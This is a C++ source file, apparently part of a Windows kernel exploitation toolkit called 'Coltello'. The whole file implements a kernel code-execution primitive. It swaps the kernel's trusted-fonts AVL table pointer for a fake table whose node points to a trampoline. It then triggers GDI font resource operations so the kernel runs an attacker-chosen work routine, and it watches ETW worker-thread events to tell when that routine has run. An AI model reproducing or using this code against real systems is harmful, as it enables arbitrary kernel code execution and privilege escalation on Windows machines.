#include "ColtelloExecutePrimitive.hpp"

namespace Coltello
{
	ColtelloExecutePrimitive::ColtelloExecutePrimitive(Task& task): 
		_traceSession(g_EtwTraceGuid, g_EtwTraceName),
		_traceConsumer(g_EtwTraceName, ColtelloEtwCallback, this)
	{
		SetTaskCallback(task);
		StartEtwSession();
	}

	void ColtelloExecutePrimitive::Pump()
	{
		_traceConsumer.ProcessTraceEvents();
	}

	void ColtelloExecutePrimitive::Execute()
	{
		auto realTable = (PRTL_AVL_TABLE) (PxsGlobals()->TrustedFontsTable);
		auto fakeTable = (PRTL_AVL_TABLE) (PxsGlobals() + 1);
		
		Infra::FontOverwriteScope::RemoveResource(g_GdiFontName);
		fakeTable->BalancedRoot.RightChild = TrampolineParameter();
		PxsGlobals()->TrustedFontsTable = fakeTable;

		SetThreadPriority(GetCurrentThread(), THREAD_MODE_BACKGROUND_BEGIN);

		Infra::FontOverwriteScope::AddResource(g_GdiFontName);
		PxsGlobals()->TrustedFontsTable = realTable;

		SetThreadPriority(GetCurrentThread(), THREAD_MODE_BACKGROUND_END);
	}

	void ColtelloExecutePrimitive::SetTaskCallback(Task& task)
	{
		UserContextPage()->WorkItem.Parameter = task.WorkParameter;
		UserContextPage()->WorkItem.WorkerRoutine = task.WorkFunction;

		_kernelRegion.FlushUserMemory();
		_state.TrampolineParameter = &KernelContextPage()->Header;
	}

	void ColtelloExecutePrimitive::StartEtwSession()
	{
		ULONG traceFlags[8] = {};
		Buffer traceFlagsStorage(sizeof(traceFlags));
		RtlCopyMemory(traceFlagsStorage.data(), &traceFlags, sizeof(traceFlags));

		_traceSession.SetInformation(TraceSystemTraceEnableFlagsInfo, traceFlagsStorage);
	}

	PCONTEXT_PAGE ColtelloExecutePrimitive::UserContextPage()
	{
		return (PCONTEXT_PAGE) (_kernelRegion.GetUserAddress());
	}

	PCONTEXT_PAGE ColtelloExecutePrimitive::KernelContextPage()
	{
		return (PCONTEXT_PAGE) (_kernelRegion.GetKernelAddress());
	}

	PRTL_BALANCED_LINKS ColtelloExecutePrimitive::TrampolineParameter()
	{
		return _state.TrampolineParameter;
	}

	PXSGLOBALS ColtelloExecutePrimitive::PxsGlobals()
	{
		return _state.Globals;
	}

	void WINAPI ColtelloExecutePrimitive::ColtelloEtwCallback(PVOID context, PEVENT_RECORD record)
	{
		if (record->EventHeader.EventDescriptor.Opcode == (PERFINFO_LOG_TYPE_WORKER_THREAD_ITEM_END & 0xFF))
		{
			auto __This = (ColtelloExecutePrimitive *) context;
			auto __WorkItemRoutine = __This->UserContextPage()->WorkItem.WorkerRoutine;

			if (__WorkItemRoutine == *(PVOID*)record->UserData)
			{
				__This->_traceSession.Stop();
			}
		}
	}
}